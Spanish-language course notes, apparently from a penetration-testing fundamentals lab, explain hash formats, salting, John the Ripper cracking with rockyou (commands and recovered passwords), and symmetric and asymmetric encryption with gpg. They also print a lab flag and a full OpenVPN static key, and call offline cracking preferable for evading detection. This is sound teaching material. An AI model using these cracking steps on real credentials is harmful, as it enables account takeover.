Si bien esto puede parecer un proceso inútil que podría llevar años, algunas técnicas y herramientas pueden hacer que el descifrado de un hash de contraseña suceda mucho más rápido, según la seguridad de la contraseña y el algoritmo de hash. Esta es una de varias razones por las que es importante utilizar contraseñas seguras.

Con respecto a la fuerza bruta, la fortaleza de una contraseña está en función de su longitud y su complejidad. Por el contrario, aumentar el conjunto de caracteres permitidos de una contraseña solo aumenta el tiempo que se tarda en aplicar la fuerza bruta en una cantidad polinomial.

Pasemos un poco más de tiempo aprendiendo sobre hashes de contraseñas para que comprendamos mejor cómo descifrarlos.

<br />

**Almacenamiento de las contraseñas.**

*Linux*

En las distribuciones de Linux, los hash de contraseña se almacenan en el archivo */etc/shadow* , que solo se puede leer con privilegios de root. Los hashes tienen el siguiente formato: "\$id\$salt\$hash". Revisemos algunos ejemplos comunes.

```
$1$: MD5-based crypt ('md5crypt')
$2$: Blowfish-based crypt ('bcrypt')[^bcrypt]
$sha1$: SHA-1-based crypt ('sha1crypt')
$5$: SHA-256-based crypt ('sha256crypt')
$6$: SHA-512-based crypt ('sha512crypt')
```

Los hashes de contraseña generalmente indican qué algoritmo hash lo produjo. Este indicador suele ser un valor numérico ubicado entre el primer y el segundo signo de dólar. Ignoraremos el término _sal_ por ahora y regresaremos a él en una sección posterior.

<br />

*Windows*

En los sistemas operativos Windows, los valores hash de las contraseñas de los usuarios se almacenan en el _Administrador de cuentas de seguridad_ (Security Account Manager, SAM). Las entradas del archivo SAM se almacenan en el siguiente formato: "uid:rid:LM-hash:NTLM-hash".

```
User:1001:E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C:::
```

En Windows existen dos algoritmos de cifrado, LM y NTLM. LM está obsoleto y en muchas ocasiones deshabilitado en las nuevas versiones de Windows debido a que es muy débil en comparación con NTLM. En aquellas máquinas en las que LM está deshabilitado con frecuencia en la sección en la que debería haber el LM-hash sólo hay el hash LM de un string vacío: aad3b435b51404eeaad3b435b51404ee.

En el resto de las máquinas Windows se puede asumir que el hash empleado tiene un formato NTLM, aunque para asegurarse, Kali Linux proporciona herramientas como [hash-identifier](https://www.kali.org/tools/hash-identifier/) o  [hashid](https://www.kali.org/tools/hashid/) aunque también tenemos herramientas online como [crackstation.net](https://crackstation.net/) 

<br />

**Exercises**

**¿Qué algoritmo de hash ha generado este hash?**: 

```defaul
jackson:$5$rounds=10000$bq1sScCI$a1RFXmjuJERyhcQ7F31Y5.TtT4fDu9v7SN6YhyTZr9:18287::::::1830576
```

El símbolo numérico '\$5\$' denota según la información descrita más arriba que se trata de un hash de formato 'sha256crypt', por tanto el algoritmo es 'sha256'.

<br />

**¿Cuál es el algoritmo de hash para contraseñas por defecto de Kali Linux?**

Visitando el fichero common-password podemos ver documentación al respecto:

```bash
cat /etc/pam.d/common-password
#
# /etc/pam.d/common-password - password-related modules common to all services
#
# This file is included from other service-specific PAM config files,
# and should contain a list of modules that define the services to be
# used to change user passwords.  The default is pam_unix.

# Explanation of pam_unix options:
# The "yescrypt" option enables
#hashed passwords using the yescrypt algorithm, introduced in Debian
#11.  Without this option, the default is Unix crypt.  Prior releases
#used the option "sha512"; if a shadow password hash will be shared
#between Debian 11 and older releases replace "yescrypt" with "sha512"
#for compatibility .  The "obscure" option replaces the old
#`OBSCURE_CHECKS_ENAB' option in login.defs.  See the pam_unix manpage
#for other options.

# As of pam 1.0.1-6, this file is managed by pam-auth-update by default.
# To take advantage of this, it is recommended that you configure any
# local modules either before or after the default block, and use
# pam-auth-update to manage selection of other modules.  See
# pam-auth-update(8) for details.

# here are the per-package modules (the "Primary" block)
password	[success=1 default=ignore]	pam_unix.so obscure yescrypt
# here's the fallback if no module succeeds
password	requisite			pam_deny.so
# prime the stack with a positive return value if there isn't one already;
# this avoids us returning an error just because nothing sets a success code
# since the modules above will each just jump around
password	required			pam_permit.so
# and here are more per-package modules (the "Additional" block)
# end of pam-auth-update config

```

<br />

**¿Qué algoritmo de hash ha generado el siguiente hash?**

```defaul
NO PASSWORD*********************:9CEF4AD8BB6E65BAAE7E0274394D0D7E
```

Empleando hash-identifier obtenemos:

```bash
HASH: NO PASSWORD*********************:9CEF4AD8BB6E65BAAE7E0274394D0D7E  

Possible Hashs:
[+] md5($pass.$salt) - Joomla
[+] SAM - (LM_hash:NT_hash)
```

De esta, forma de entre los candidatos obtenemos el correcto que es NTLM hash.

<br />

**¿Qué algoritmo de hash ha generado el siguiente hash?**

```defaul
482c811da5d5b4bc6d497ffa98491e38
```

Introduciendolo en hash identifier:

```bash
hash-identifier <<< 482c811da5d5b4bc6d497ffa98491e38
```

Obtenemos que lo más probable es que s etrate de un hash MD5 y así es. Utilizando crackstation.net podemos obtener que se trata de 'password123'.

<br />

**¿Cuál es el algoritmo de hashing por defecto de Windows?**

NTLM.

<br />

##### 4.0.1.5.2. Salting.

**Definición y utilidad**

Un *salt* técnicamente es un string random único que sea mezcla con los datos antes de crear el hash de los mismos (creando así el hash de la combinación).

El salting (es decir, el uso del salt ) es muy útil debido a que dado que cada input produce un único output para un mismo algoritmo de hash, entonces "contaminar" los datos con un string aleatorio vuelve el resultado menos predecible para un atacante que esté intentando obtener la muestra original. 

Así por ejemplo, si queremos crear el hash de una contraseña predecible, "openup" se creará el siguiente hash "fd9edfb25da9042f7c56353956af97a3" en MD5 que es fácilmente crackeable con las herramientas vistas anteriormente. Sin embargo, con la técnica del salting, se crearía el hash de "om3b2x:openup"; "4cfd6c245eca0bd0af0851105a117a25" que ya no es fácilmente predecible para herramientas convencionales. 

<br />

**Exercises**

Tenemos la siguiente línea sacada del fichero /etc/shadow:

```defaul
root:$y$j9T$0WzBWAjJ52qoJ3iqHwwWI/$SyNhVa7RG//CSAPfMCXZTgLN4TMw44kSNGI.DIIKSJ3:18975:0:99999:7:::
```

Por un lado, sabemos que el formato de las líneas del fichero /etc/shadow es

```defaul
username:password-hash:last-password-change:minimum-days-until-change-:maximun-days-until-change:warn:inactive:expire
```

A su vez, el password-hash se estructura de la siguiente forma: "\$id\$param\$salt\$hashedpassword". El id es un número que identifica el algoritmo empleado y el parámetro es una opción del algoritmo empleado.

De esta forma, para la línea anterior, el salt tiene la siguiente forma: "0WzBWAjJ52qoJ3iqHwwWI/" 

<br />

**Crea un 'salted hash' empleando el algoritmo SHA-512-based con la contraseña 'foobar' y el salto:M3vwJPAueK2a1vNM**

Para resolver este problema empleamos el comando 'mkpasswd'.

```bash
mkpasswd foobar -m sha-512 -S M3vwJPAueK2a1vNM
$6$M3vwJPAueK2a1vNM$uILLUy6MrFVQEJWIy8dw94oMfdy1fuHKk.yGDk89S14k3UbK3Em0wlanQAJ1RhicTH2OOsrhfMpaNnQS0s.C60
```

##### 4.0.1.5.3. Password Cracking.

**Definición**

El 'cracking' o descifrado de contraseñas se refiere a una amplia gama de ataques que buscan establecer la contraseña de un usuario o servicio a través de medios ilegítimos. Podemos categorizar el descifrado de contraseñas según el método utilizado para determinar una contraseña correcta. Podríamos intentar iniciar sesión en un sistema en vivo o quizás ya tengamos acceso al hash almacenado de una contraseña. El primer contexto se llama craqueo online (y es susceptible de ser detectado por un IDS) y el segundo se llama craqueo offline. 

Es preferible descifrar contraseñas sin conexión porque es mucho más discreto. Una vez que tenemos acceso a un hash, podemos utilizar importantes recursos informáticos locales para intentar reproducir el mismo hash, ya sea con ataques de fuerza bruta o mediante ataques basados en diccionario.
Como se mencionó anteriormente, los ataques de fuerza bruta probarán todas las combinaciones posibles de un conjunto de caracteres para la longitud máxima dada de una contraseña. En la práctica, a menudo podemos hacer que este proceso sea más eficiente haciendo algunas suposiciones. Por ejemplo, podríamos suponer que es más probable que la primera letra esté en mayúscula que otras letras. También podemos priorizar los intentos favoreciendo palabras que contengan caracteres de uso más común, etc.

Los ataques basados en lista de diccionario son una forma especial de brute-forcing. Mientras que este último se basa en probar con todas las combinaciones dentro de un rango de números, símbolos y caracteres el primero se basa en pobrar una operación con todos los candidatos de una lista. Un diccionario en este caso es una lista de palabras que se pueden probar como contraseñas (candidatos).

<br />

**Rockyou.txt**

Un diccionario bastante común se llama "rockyou". En 2009, una empresa llamada RockYou sufrió una brecha. Esta violación de datos incluyó todas sus contraseñas, que se habían almacenado en texto sin formato, y la lista completa de contraseñas se hizo pública más tarde. Dado que contiene una gran cantidad de contraseñas comunes, es una herramienta popular para los ataques de diccionario. Debido a su tamaño, Kali Linux contiene esta lista en formato comprimido en el path: 
/usr/share/wordlists/rockyou.txt.gz .

<br />

John the Ripper es una herramienta cli (command-line) de cracking de contraseñas basada en la línea de comandos. Exploremos cómo podemos usar a John para descifrar una contraseña usando la lista de palabras rockyou.txt.

Comenzaremos copiando el archivo gzip comprimido rockyou.txt.gz en el directorio de inicio.

```bash
kali@kali:~$ cp /usr/share/wordlists/rockyou.txt.gz .; gunzip rockyou.txt.gz
```

luego lo descomprimiremos con el comando gunzip:

```bash
kali@kali:~$ echo "User:1001:aad3b435b51404eeaad3b435b51404ee:4056DA565EFF865C23687B2D1CEF8242:::" > ntlm.hash
```
 
 Una vez que hayamos hecho eso, colocaremos un hash de ejemplo en un archivo, llamado ntlm.hash, luego usaremos a John the Ripper para descifrar la contraseña

```bash
kali@kali:~$ /usr/sbin/john -wordlist=rockyou.txt ntlm.hash
Created directory: /home/kali/.john
Warning: detected hash type "LM", but the string is also recognized as "NT"
Use the "--format=NT" option to force loading these as that type instead
Using default input encoding: UTF-8
Using default target encoding: CP850
Loaded 1 password hash (LM [DES 256/256 AVX2])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (User)
1g 0:00:00:00 DONE (2021-03-08 09:48) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..MUSTANG
Use the "--show --format=LM" options to display all of the cracked passwords reliably
Session completed
```

Dado que el formato de los hash NTLM y LM es idéntico, John no puede decir de inmediato qué tipo de hash le proporcionamos y por eso despliega una alerta. Observamos que John descifró la contraseña de LM vacía; sin embargo, recuerde que Windows ya no utiliza LM. John también nos notificó que se reconoció un hash de NT. Podemos usar la opción --format=NT para especificar que queremos que John asuma que el hash fue producido por NTLM.

```bash
kali@kali:~$ /usr/sbin/john -wordlist=rockyou.txt ntlm.hash --format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
user00           (User)
1g 0:00:00:00 DONE (2021-03-08 09:51) 7.692g/s 22816Kp/s 22816Kc/s 22816KC/s user7783..usefull
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

<br />

**Exercises**

**Utilize john the ripper para descifrar los siguientes hashes:**
```
2104d32130dd99227199321a2cfa8ee277d296e6
```

En primer lugar, utilizamos 'hash-identifier' para detectar el algoritmo del hash:

```bash
hash-identifier <<< 2104d32130dd99227199321a2cfa8ee277d296e6

Possible Hash:

[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

Seguidamente, buscamos la nomenclatura del hash en la herramienta JohnTheRipper.

```bash
john --list=formats | grep SHA1                                   
416 formats (149 dynamic formats shown as just "dynamic_n" here)
Padlock, Palshop, Panama, PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1, Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1, Raw-SHA1-AxCrypt, Raw-SHA1-Linkedin, Raw-SHA224, Raw-SHA256, Raw-SHA3, Salted-SHA1, SSHA512, sapb, sapg, saph, sappse, securezip, 7z, Signal, SIP, HMAC-MD5, HMAC-SHA1, HMAC-SHA224, HMAC-SHA256, HMAC-SHA384, HMAC-SHA512,
```

Observamos que en ausencia de un nombre más simple, el término del formato buscado es Raw-SHA1. Así, empleamos el siguiente comandio:

```bash
john hash.txt -w=/usr/share/wordlists/rockyou.txt -format=Raw-SHA1 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
$$spongebob13$$  (?)     
1g 0:00:00:00 DONE (2022-12-20 05:41) 1.063g/s 15242Kp/s 15242Kc/s 15242KC/s $$stevieg$$..$$spongebob13$$
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

<br />

```
user:$2y$10$oHnLh4lejEKMTqo7vARr7O56/O1DgT3kscywsmF5zKtkSxlgAJ2v2
```

Esta es consistente de dos campos, un nombre de usuario y un passhash. El passhash a su vez está compuesto por el id \$2y\$, que se corresponde con bcrypt. Así, buscamos en John el nombre de este formato:

```bash
john --list=formats | grep bcrypt
416 formats (149 dynamic formats shown as just "dynamic_n" here)
descrypt, bsdicrypt, md5crypt, md5crypt-long, bcrypt, scrypt, LM, AFS,
```

Y lo crakeamos:

```bash
echo "user:$2y$10$oHnLh4lejEKMTqo7vARr7O56/O1DgT3kscywsmF5zKtkSxlgAJ2v2" > hash.txt

john hash.txt -w=/usr/share/wordlists/rockyou.txt -format=bcrypt  
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess1        (user)     
1g 0:00:00:00 DONE (2022-12-20 06:01) 1.010g/s 145.4p/s 145.4c/s 145.4C/s mylove..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

<br />

```defaul
admin:$apr1$6ltm98zs$goKTtVsQwmLsj6kDH1981/
```

En este caso, dejamos que el propio John detecte el hash:

```bash
john hash.txt                 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 48 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
angel13          (admin)     
1g 0:00:00:02 DONE 3/3 (2022-12-20 07:04) 0.4000g/s 102795p/s 102795c/s 102795C/s bisner..angico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<br />

#### 1.6. Symmetric-Key Encryption.

Mientras que el *hashing* se ocupa parcialmente de la confidencialidad, soreb todo se emplea para garantizar la integridad de un fichero que se transfiere o se guarda por un tiempo.

El *cifrado con clave* ya sea simétrica o asimétrica se emplea para garantizar la confidencialidad de los datos (es decir, la prevención de que cualquier pueda tener acceso a datos de forma ilegítima). Existen dos tipos principales de cifrado, el cifrado con clave simétrica y el cifrado con clave asimétrica.

La diferencia del cifrado y la codificación consiste en que la codificación transforma el formato del texto cambiando cada caracter por su equivalente en otro formato. Mientras que el cifrado consiste en el empleo de una clave y un algoritmo de cifrado para transformar un string en otro string en el mismo formato.

<br />

##### 4.0.1.6.1. Symmetric Keys.

En criptografía una clave criptográfica es una línea de caracteres únicos, difícilmente replicable, que se utiliza junto con un algoritmo criptográfico para cifrar o descifrar un mensaje. 

Los algoritmos de clave simétrica usan la misma clave para cifrar el texto sin formato (a veces también llamado texto sin cifrar) en texto cifrado y para descifrar el texto cifrado de nuevo en texto sin formato.

No debe confundirse la 'passphrase' con la clave, esta primera es una frase que protege del uso de la segunda de forma ilegítima.

<br />

##### 4.0.1.6.2. Caesar Cipher.

Un ejemplo de un algoritmo de cifrado de clave simétrica es el llamado cifrado César, llamado así por el general romano Julio César.

Se puede implementar un cifrado César para el alfabeto inglés eligiendo cualquier número entre 1 y 25, así como una dirección (izquierda o derecha). El número más la dirección se combinan y se utilizan como una clave simétrica extremadamente primitiva y débil. Una vez que se determina la clave, podemos cifrar cualquier mensaje en inglés _cambiando_ cada carácter del mensaje por el valor de la clave.

Por ejemplo, supongamos que decidimos usar una clave de 5 a la derecha y deseamos cifrar el mensaje "Pruébelo más". Una vez que apliquemos la clave elegida a este mensaje, obtendremos el texto cifrado "Ywd Mfwijw".

Las claves de cifrado César como esta a menudo se identifican con el prefijo "ROT". En el ejemplo anterior se ha empleado "ROT5" pero ROT13 es un cifrado particularmente popular ya que el alfabeto inglés se compone de 26 letras. Cuando una letra determinada se cifra con ROT13, se reemplaza con la letra número 13 después de esta en el alfabeto. Dado que 13 está a la mitad de 26, ya no es necesario que nos preocupemos por la dirección del cifrado: desplazar un carácter hacia adelante o hacia atrás producirá el mismo resultado. Por lo tanto, tanto el cifrado como el descifrado se pueden realizar cambiando en cualquier dirección.

Para reproducir ROT13, podemos usar el comando tr en Kali.

```bash
echo text to encrypt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
grkg gb rapelcg

echo grkg gb rapelcg | tr 'A-Za-z' 'N-ZA-Mn-za-m'
text to encrypt
```

<br />

**Exercises**


Decodifica la siguiente cadena en ROT13:

153528n904o13716n8oo0r11693q9768n2sp8n7p38q879opp930s707013rss03

```bash
echo 153528n904o13716n8oo0r11693q9768n2sp8n7p38q879opp930s707013rss03 | tr 'A-Za-z' 'N-ZA-Mn-za-m'
153528a904b13716a8bb0e11693d9768a2fc8a7c38d879bcc930f707013eff03
```

<br />



##### 4.0.1.6.3. Cifrado XOR.

Otro cifrado de cifrado simple es el cifrado XOR. Podría decirse que es igualmente popular y solo un poco más fuerte que los cifrados de sustitución. Es un algoritmo de clave simétrica basado en la operación XOR bit a bit. Según el texto sin formato de entrada y la clave, el texto cifrado de salida puede quedar fuera del conjunto de caracteres alfabéticos. En esos casos, los caracteres se representan en formato hexadecimal.

Los cifrados XOR a veces se usan en software malicioso para evitar que un analista descifre fácilmente lo que está haciendo la aplicación. Mediante el XOR de las instrucciones de la máquina, un hacker puede intentar que sea más difícil realizar un análisis estático de una aplicación maliciosa, ya que los datos cifrados no representarán instrucciones válidas de la máquina.

Revisemos un ejemplo de XOR muy simple usando Python

```python
#!/usr/bin/python3
from itertools import cycle

key = 'K'
message = 'text to encrypt'

cryptedMessage = ''.join(chr(ord(c)^ord(k)) for c,k in zip(message, cycle(key)))

print(cryptedMessage)
print(cryptedMessage.encode())

plaintext = ''.join(chr(ord(c)^ord(k)) for c,k in zip(cryptedMessage, cycle(key)))

print(plaintext)
```

<br />


##### 4.0.1.6.4. Cifrado BlowFish.

**Definición**

El cifrado Blowfish fue creado por el criptógrafo y experto en seguridad Bruce Schneier en 1993. Es un *cifrado de bloque*, lo que significa que opera en texto sin formato al convertirlo en texto cifrado un "bloque" a la vez, donde un bloque es una cantidad de bytes mayor que una unidad.

Por ejemplo, un cifrado de bloque de 16 bits tomaría el texto sin formato "Try Harder" y operaría primero en la cadena "Try ", luego en "Hard" y finalmente en "er".

En la práctica, los cifrados de bloque de menos de 64 bits se consideran débiles.

Blowfish es un cifrado de bloque de 64 bits, por lo que el algoritmo opera sobre ocho bytes de texto sin formato a la vez. Por el contrario, los cifrados Caesar y XOR se consideran _cifrados de flujo_ porque operan en texto sin formato solo un byte a la vez (es decir, cada letra del texto sin formato se modifica de forma independiente).

<br />

**GPG**

Podemos comenzar a jugar con Blowfish y otros cifrados utilizando la herramienta de línea de comandos gpg , que ya está instalada en Kali Linux.

_GNU Privacy Guard_ (GPG) es una versión gratuita y de código abierto de _Pretty Good Privacy_ (PGP), que es un producto criptográfico que generalmente se usa para el cifrado de correo electrónico.

Comenzaremos creando un archivo que deseamos cifrar. Luego, usaremos gpg con el indicador -c para seleccionar el cifrado de clave simétrica y el indicador --cipher-algo- para elegir nuestro cifrado.

```
kali@kali:~$ echo "Let's try some symmetric-key encryption." > blowfish.plain

kali@kali:~$ gpg -c --cipher-algo blowfish blowfish.plain
kali@kali:~$ 
```

Al ingresar el comando, se nos pedirá que ingresemos una frase de contraseña para cifrar el archivo. Usaremos la frase de contraseña "onefishtwofish". GPG nos advertirá que la frase de contraseña elegida es débil, pero seguiremos adelante y la usaremos de todos modos.

Una vez que hayamos encriptado el archivo de texto claro, notaremos un nuevo documento dentro de nuestro directorio de trabajo, blowfish.plain.gpg . Si quisiéramos, podríamos haber especificado el nombre del archivo encriptado con el indicador --output . También notaremos que el archivo encriptado es aproximadamente tres veces más grande que el original y que su tipo de archivo ha cambiado de texto ASCII normal a datos encriptados.

```
kali@kali:~$ ls -l blowfish*
-rw-r--r-- 1 kali kali      40 Apr 19 13:34 blowfish.plain
-rw-r--r-- 1 kali kali     116 Apr 19 13:38 blowfish.plain.gpg

kali@kali:~$ file blowfish.plain.gpg
blowfish.plain.gpg: GPG symmetrically encrypted data (BLOWFISH cipher)

kali@kali:~$ cat blowfish.plain.gpg
�W��'xBR��c:{rv��������3�7|"�@������O-]�!��NN�j���
                                                  ��;L�Pud�Q׆!�}g�bi�B?���g�9���/E��r���5����ٺ
```

Para descifrar el archivo, simplemente necesitamos ejecutar gpg --decrypt blowfish.plain.gpg . Descifrar con gpg envía los resultados a la salida estándar, a menos que un archivo esté designado con el indicador --output . Una vez más, escribiremos la frase de contraseña cuando se nos solicite.

```
kali@kali:~$ gpg --decrypt blowfish.plain.gpg
gpg: BLOWFISH.CFB encrypted data
gpg: encrypted with 1 passphrase
Let's try some symmetric-key encryption.
```

La herramienta gpg es capaz de realizar otras funciones además del cifrado de clave simétrica, como hashing, compresión y cifrado de clave asimétrica también.

<br />

##### 4.0.1.6.5. Advanced Encryption Standard (AES)

El _estándar de cifrado avanzado_ (Advanced Encryption Standard) es una familia de cifrados de bloque de clave simétrica. Donde Blowfish usa un tamaño de bloque de 64 bits, AES usa un tamaño de bloque de 128 bits. Esto significa que el algoritmo opera con 16 bytes de datos a la vez. Otra diferencia entre Blowfish y AES es que el primero emplea un tamaño de clave variable (entre 32 y 448 bits), mientras que el segundo tiene tres variantes fijas definidas (128 bits, 192 bits y 256 bits). Blowfish usa la Feistel Network donde AES usa la Substitution-permutation network.

La mecánica de usar GPG para cifrar y descifrar archivos con AES es idéntica a cómo lo hicimos con Blowfish. El comando 

```bash
gpg -c --cipher-algo aes256 <filename>
```

nos permitirá cifrar un archivo. 

Usemos la misma entrada y frase de contraseña que en el ejemplo de Blowfish, y observemos cualquier diferencia en el texto cifrado:

```bash
kali@kali:~$ cp blowfish.plain aes256.plain

kali@kali:~$ gpg -c --cipher-algo aes256 aes256.plain

kali@kali:~$ ls -l aes256*
-rw-r--r-- 1 kali kali      40 Apr 19 16:23 aes256.plain
-rw-r--r-- 1 kali kali     122 Apr 19 16:24 aes256.plain.gpg

kali@kali:~$ file aes256.plain.gpg
aes256.plain.gpg: GPG symmetrically encrypted data (AES256 cipher)

kali@kali:~$ cat aes256.plain.gpg 
�       �����ߕ��i/3}� �0sK�M2�9��TC
                                   �ZKh7�?�EC�����w��j(��uy����e�:��m�����|�▒�7^�-�3"���O�V�/�����ϑ�)m؍$z��9
```

A pesar de utilizar el mismo texto y passphrase, el texto cifrado con AES es ligeramente más largo. Lo podemos descifrar de la misma manera:

```bash
kali@kali:~$ gpg --decrypt aes256.plain.gpg
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase
Let's try some symmetric-key encryption.
```

<br />

**Exercises**

**Cifre el archivo llamado _mensaje secreto_ con AES256 usando gpg. Antes de cifrarlo, asegúrese de que el nombre sea "mensaje secreto" y no el nombre generado después de descargarlo. Además, proporcione la contraseña 'prueba' cuando se le solicite. ¿Qué tamaño en bytes tiene el archivo de salida después de aplicar el algoritmo de cifrado?**

```bash
gpg -c --cipher-algo aes256 secret-message; ls -la | grep secret-message.gpg
```

<br />

**¿El tamaño de una clave de cifrado afecta a la longitud del mensaje cifrado resultante?**

No

<br />

**¿Examine el fichero cifrado, qué cifrado es?**

```bash
file 1fa251726d99553441b1800176a86681-decrypt-me.gpg 
1fa251726d99553441b1800176a86681-decrypt-me.gpg: GPG symmetrically encrypted data (BLOWFISH cipher)
```

<br />

**Descifre el fichero cifrado**

```bash
gpg --decrypt 1fa251726d99553441b1800176a86681-decrypt-me.gpg 
gpg: BLOWFISH.CFB encrypted data
gpg: encrypted with 1 passphrase
OS{symmetricencryptionnoitpyrcnecirtemmys}
gpg: WARNING: message was not integrity protected
gpg: Hint: If this message was created before the year 2003 it is
     likely that this message is legitimate.  This is because back
     then integrity protection was not widely used.
gpg: Use the option '--ignore-mdc-error' to decrypt anyway.
gpg: decryption forced to fail!
```

<br />

**¡Se puede encontrar otra aplicación de cifrado simétrico dentro de la VPN en este mismo laboratorio! Descargue el paquete VPN para conectarse a este laboratorio y examine el contenido con el comando _cat ._ ¿Cuántos bits tiene la clave estática de OpenVPN dentro del archivo?**

```bash
tail -n 24 fundamentals.ovpn
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
56837e8909f3a73c34d8432a61290482
895eae923f996df272a0ed47392de988
56f236d1309c5b536518b2502888df30
2afc83dd51275414291c660bf5a9dff2
bdc920b3e8ffd46f28ca439caf27b127
8295d3f05a504e916676fb91e8ac7703
5cc0a13a077104b1128dcb893fdcca3a
369edbca02136a1229b7b3a594c1ec16
2a3b72da5557e7f1d1998e87456fd866
ce14884e6f62f9be1cc56e2f932c8bb1
fb2ff46bfbaccf7dda57bbcbf0c83b48
c8e21cbb564a765969a9bc42618c3f43
f7bed31c57c06735f6ac6f09e1c02739
a35da2f412b290a1198b928d1d2db198
5726744b5255634cd4f98f9997069471
0950abcd6b01cef78ae2ea0c95651430
-----END OpenVPN Static key V1-----


</tls-crypt>  
```

<br />

**¿Qué cifrado de encriptación usa la VPN?**

```
kali@kali:~$ sudo openvpn ./pwk2.ovpn
[sudo] password for kali: 
2022-08-09 10:48:11 Note: Treating option '--ncp-ciphers' as  '--data-ciphers' (renamed in OpenVPN 2.5).
2022-08-09 10:48:11 DEPRECATED OPTION: --cipher set to 'AES-128-CBC' but missing in --data-ciphers (AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-128-CBC' to --data-ciphers or change --cipher 'AES-128-CBC' to --data-ciphers-fallback 'AES-128-CBC' to silence this warning.
2022-08-09 10:48:11 OpenVPN 2.5.7 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Jul  5 2022
2022-08-09 10:48:11 library versions: OpenSSL 3.0.3 3 May 2022, LZO 2.10
2022-08-09 10:48:11 TCP/UDP: Preserving recently used remote address: [AF_INET]34.196.6.168:1194
2022-08-09 10:48:11 UDP link local: (not bound)
2022-08-09 10:48:11 UDP link remote: [AF_INET]34.196.6.168:1194
2022-08-09 10:48:12 [offensive-security.com] Peer Connection Initiated with [AF_INET]34.196.6.168:1194
2022-08-09 10:48:12 TUN/TAP device tun0 opened
2022-08-09 10:48:12 net_iface_mtu_set: mtu 1500 for tun0
2022-08-09 10:48:12 net_iface_up: set tun0 up
2022-08-09 10:48:12 net_addr_v4_add: 192.168.119.241/24 dev tun0
2022-08-09 10:48:12 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2022-08-09 10:48:12 Initialization Sequence Completed
```

AES-128-CBC

<br />

#### 1.7. Asymmetric Encryption.

Recuerde que uno de los principales problemas con el cifrado de clave simétrica es que una sola clave debe mantenerse en secreto, pero paradójicamente también debe compartirse entre los socios de comunicación. Esto significa que el cifrado de clave simétrica es tan seguro como el canal utilizado para compartir la clave. El cifrado *asimétrico* o *de clave pública* resuelve este problema empleando dos claves diferentes, pero relacionadas matemáticamente, para el cifrado y el descifrado, respectivamente.

<br />

##### 1.7.1. Asymmetric Encryption Theory.

**Definición**

El cifrado de clave asimétrica se asienta sobre el concepto de "par de claves". Este consiste en dos claves, una pública que se distribuye y una privada que se guarda confidencialmente. La funcionalidad de cada una de estas claves es complementaria a la otra, cada una descifra lo que la otra cifra. En un sentido matemático se dice que cada uno es la inversa de la otra; f(f^-1(x)) = x.

El rol que se asocia a cada una es el siguiente:

- La clave pública se distribuye entre los socios de comunicación para que cifren los mensajes.
- La clave privada permanece en poder de aquel que recibe dichos mensajes para poder descifrarlos y leerlos.

<br />

**Herramientas de cifrado asimétrico y proof concept.**

Podemos utilizar de nuevo *GPG* para generar un par de claves en Kali:

```bash
kali@kali:~$ gpg --gen-key
gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: Offsec
Email address: test@example.com
You selected this USER-ID:
    "Offsec <test@example.com>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? o
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key 4935190D131B0ED9 marked as ultimately trusted
gpg: directory '/home/kali/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/E0640A6E680FA6590DD0F03D4935190D131B0ED9.rev'
public and secret key created and signed.

pub   rsa3072 2021-04-20 [SC] [expires: 2023-04-20]
      E0640A6E680FA6590DD0F03D4935190D131B0ED9
uid                      Offsec <test@example.com>
sub   rsa3072 2021-04-20 [E] [expires: 2023-04-20]
```

Con esto, hemos creado un par de claves pública/privada. Ahora necesitamos exportar la clave pública creando un fichero que pueda ser compartido con otros recipientes. Para ello empleamos el siguiente comando:

```bash
gpg --output <output-file> --armor --export <name-or-email-address>
```

